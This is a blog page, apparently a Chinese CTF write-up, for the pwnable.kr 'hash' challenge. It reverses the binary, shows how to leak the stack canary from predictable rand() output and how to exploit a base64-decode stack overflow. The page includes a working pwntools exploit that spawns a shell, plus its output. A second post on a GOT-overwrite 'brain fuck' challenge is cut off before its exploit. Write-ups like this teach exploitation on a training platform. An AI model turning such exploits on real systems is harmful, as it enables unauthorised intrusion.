            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是一个很有pwn味道的题目，涉及的知识在掌握范围内所以做起来很爽！</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目只给了可执行文件<code>hash</code>。于是就放到<code>ida</code>中逆向了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+18h] [bp-8h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+1Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"- Welcome to the free MD5 calculating service -"</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v6 = my_hash();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Are you human? input captcha : %d\n"</span>, v6);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v6 != v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wrong captcha!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome! you are authenticated."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Encode your data with BASE64 then paste me!"</span>);</span><br><span class="line">  process_hash();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you for using our service."</span>);</span><br><span class="line">  system(<span class="string">"echo `date` &gt;&gt; log"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_hash</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// edx@4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+0h] [bp-38h]@1</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">32</span>]; <span class="comment">// [sp+Ch] [bp-2Ch]@2</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+10h] [bp-28h]@4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+14h] [bp-24h]@4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+18h] [bp-20h]@4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+1Ch] [bp-1Ch]@4</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+20h] [bp-18h]@4</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+24h] [bp-14h]@4</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+28h] [bp-10h]@4</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+2Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v11 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    *(_DWORD *)&amp;v3[<span class="number">4</span> * i] = rand();</span><br><span class="line">  result = v7 - v9 + v10 + v11 + v5 - v6 + v4 + v8;</span><br><span class="line">  v1 = *MK_FP(__GS__, <span class="number">20</span>) ^ v11;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">process_hash</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST14_4@3</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// ST18_4@3</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+1Ch] [bp-20Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+21Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">memset</span>(g_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_buf));</span><br><span class="line">  fgets(g_buf, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  v0 = Base64Decode(g_buf, (<span class="keyword">int</span>)&amp;v3);</span><br><span class="line">  ptr = calc_md5((<span class="keyword">int</span>)&amp;v3, v0);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"MD5(data) : %s\n"</span>, ptr);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">Base64Decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// ST2C_4@1</span></span><br><span class="line">  FILE *stream; <span class="comment">// ST34_4@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST38_4@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ST3C_4@1</span></span><br><span class="line"></span><br><span class="line">  v2 = calcDecodeLength(a1);</span><br><span class="line">  stream = (FILE *)fmemopen((<span class="keyword">int</span>)a1, <span class="built_in">strlen</span>(a1), (<span class="keyword">int</span>)&amp;unk_8049272);</span><br><span class="line">  v4 = BIO_f_base64();</span><br><span class="line">  v5 = BIO_new(v4);</span><br><span class="line">  v6 = BIO_new_fp(stream, <span class="number">0</span>);</span><br><span class="line">  v7 = BIO_push(v5, v6);</span><br><span class="line">  BIO_set_flags(v7, <span class="number">256</span>);</span><br><span class="line">  *(_BYTE *)(a2 + BIO_read(v7, a2, <span class="built_in">strlen</span>(a1))) = <span class="number">0</span>;<span class="comment">// overflow</span></span><br><span class="line">  BIO_free_all(v7);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>贴出来了最关键的几个函数。通过ida反编译的代码还是很容易理清程序逻辑的，其中可以发现两处漏洞。</p>
<ul>
<li><code>my_hash</code>函数中使用的变量<code>v11</code>其实是<code>stack canary</code>。</li>
<li><code>Base64Decode</code>函数会把<code>a1</code>地址处的字符串base64解码，然后会把解码后的数据复制到<code>a2</code>所指示的缓冲区内，这里由于最大复制长度使用<code>strlen(a1)</code>而不是<code>a2</code>的长度导致溢出。</li>
</ul>
<p>程序的保护如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ checksec <span class="built_in">hash</span></span><br><span class="line">[*] <span class="string">'/home/root/\xe6\xa1\x8c\xe9\x9d\xa2/test/hash'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
<p>由于是栈溢出漏洞，只要通过<code>my_hash</code>函数的漏洞leak出<code>canary</code>就可以getshell。在<code>my_hash</code>中调用了<code>rand</code>函数，只要随机种子一样那么就可以预测任意一次的随机值，另外<code>time(0)</code>函数返回的时间是以秒为单位的，所以完全可以获得种子。<br>接下来就可以栈溢出覆盖返回地址了。<code>system</code>的地址可以使用它的plt地址，那<code>/bin/sh</code>地址呢？这里可以让程序溢出时重新跳入<code>process_hash</code>函数然后输入该字符串，把该字符串存储在数据段，由于数据段地址不变所以可以这样利用。<br>整理下利用思路：</p>
<ol>
<li>在连接题目时本地同样以<code>time</code>函数设置随机种子，获得随机序列并计算<code>canary</code></li>
<li>布置栈空间，使程序溢出时执行<code>process_hash</code>函数并向数据段写入<code>/bin/sh</code></li>
</ol>
<p>下面是exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(DEBUG)</span>:</span></span><br><span class="line">    context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">    ll = ctypes.cdll.LoadLibrary</span><br><span class="line">    lib = ll(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    system_plt = <span class="number">0x08048880</span></span><br><span class="line">    process_hash_addr = <span class="number">0x08048f92</span></span><br><span class="line">    data_var = <span class="number">0x0804b0e0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        r = process(<span class="string">'./hash'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9002</span>)</span><br><span class="line">        </span><br><span class="line">    lib.srand(lib.time(<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># my_hash</span></span><br><span class="line">    v3 = lib.rand()</span><br><span class="line">    v4 = lib.rand()</span><br><span class="line">    v5 = lib.rand()</span><br><span class="line">    v6 = lib.rand()</span><br><span class="line">    v7 = lib.rand()</span><br><span class="line">    v8 = lib.rand()</span><br><span class="line">    v9 = lib.rand()</span><br><span class="line">    v10 = lib.rand()</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">' : '</span>)</span><br><span class="line">    rel = int(r.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line">    canary = rel-v7+v9-v10-v5+v6-v4-v8</span><br><span class="line">    canary &amp;= <span class="number">0xffffffff</span>  </span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x200</span> <span class="comment">#junk code</span></span><br><span class="line">    payload += p32(canary)+<span class="string">'a'</span>*<span class="number">12</span></span><br><span class="line">    payload += p32(process_hash_addr)+p32(system_plt)<span class="comment">#ret addr</span></span><br><span class="line">    payload += <span class="string">'a'</span>*<span class="number">4</span>+p32(data_var)</span><br><span class="line">    payload = base64.b64encode(payload)</span><br><span class="line">    </span><br><span class="line">    r.sendline(str(rel))</span><br><span class="line">    r.recvuntil(<span class="string">'me!\n'</span>)</span><br><span class="line">    r.sendline(payload+<span class="string">'\n'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    r.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">work(<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ python 1.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9002: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line"><span class="built_in">log</span></span><br><span class="line">log2</span><br><span class="line">md5calculator</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">Canary, Stack guard, Stack protector.. what is the correct expression?</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>要注意的是，如果网速太差就会导致<code>canary</code>计算错误，解决办法是将exp上传到题目服务器本地执行（看题目提示）</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><code>stack canary</code>能很好的防止栈溢出，但是程序的其他地方如果能够泄漏<code>canary</code>还是没卵用。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/25/pwnable.kr-brain fuck/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/25/pwnable.kr-brain fuck/" itemprop="url">
                  pwnable.kr-brain fuck
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-25 10:58:05" itemprop="dateCreated datePublished" datetime="2018-02-25T10:58:05+08:00">2018-02-25</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/25/pwnable.kr-brain fuck/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/25/pwnable.kr-brain fuck/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/25/pwnable.kr-brain fuck/" class="leancloud_visitors" data-flag-title="pwnable.kr-brain fuck">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题就有点pwn的意思了嘛</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目只给了一个可执行文件<code>bf</code>和一个动态链接文件<code>bf_libc.so</code>，看来只有逆向它了。使用ida反编译一下<code>bf</code>逆向它的逻辑<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// edx@4</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [sp+28h] [bp-40Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+2Ch] [bp-408h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+42Ch] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v7 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  p = (<span class="keyword">int</span>)&amp;tape;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to brainfuck testing system!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"type some brainfuck instructions except [ ]"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  fgets((<span class="keyword">char</span> *)&amp;v6, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v6); ++i )</span><br><span class="line">    do_brainfuck(*((_BYTE *)&amp;v6 + i));</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>) ^ v7;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这是<code>main</code>函数，逻辑简单，主要是对输入字符串的每个字符调用<code>do_brainfuck</code>函数处理。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">do_brainfuck</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// ebx@7</span></span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">62</span>:                                    <span class="comment">// &gt;</span></span><br><span class="line">      result = p++ + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">60</span>:                                    <span class="comment">// &lt;</span></span><br><span class="line">      result = p-- - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">43</span>:                                    <span class="comment">// +</span></span><br><span class="line">      result = p;</span><br><span class="line">      ++*(_BYTE *)p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">45</span>:                                    <span class="comment">// -</span></span><br><span class="line">      result = p;</span><br><span class="line">      --*(_BYTE *)p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">46</span>:                                    <span class="comment">// .</span></span><br><span class="line">      result = <span class="built_in">putchar</span>(*(_BYTE *)p);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">44</span>:                                    <span class="comment">// ,</span></span><br><span class="line">      v2 = (_BYTE *)p;</span><br><span class="line">      result = getchar();</span><br><span class="line">      *v2 = result;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">91</span>:                                    <span class="comment">// [</span></span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">"[ and ] not supported."</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>do_brainfuck</code>函数对传入的字符进行<code>switch</code>选择，显然这里可以对<code>p</code>地址的内容进行操作，可以改变地址值可以往地址里读写内容。那么<code>p</code>是啥东西呢？查看反汇编可以发现，<code>p</code>存储的地址就在<code>.bss</code>段，它的上面就是<code>got</code>表。所以思路就是通过<code>do_brainfuck</code>函数改写<code>got</code>表，获得shell。使用<code>checksec</code>发现程序的保护情况如下，可以通过改写<code>got</code>表获得shell。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ checksec bf</span><br><span class="line">[*] <span class="string">'/root/\xe6\xa1\x8c\xe9\x9d\xa2/test/bf'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ checksec bf_libc.so </span><br><span class="line">[*] <span class="string">'/root/\xe6\xa1\x8c\xe9\x9d\xa2/test/bf_libc.so'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
<p>具体思路是：</p>
<ol>
<li>获得<code>fgets</code>函数的地址</li>
<li>根据libc中各函数的相对偏移计算<code>system,gets</code>函数的地址</li>
<li>将<code>got</code>表中<code>memset</code>覆盖为<code>gets</code>，<code>fgets</code>覆盖为<code>system</code>，<code>putchar</code>覆盖为<code>main</code></li>
<li>通过覆盖后的<code>gets</code>函数输入<code>/bin/sh</code></li>
</ol>
<p>这样当再次执行回<code>main</code>函数时即可getshell。具体exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 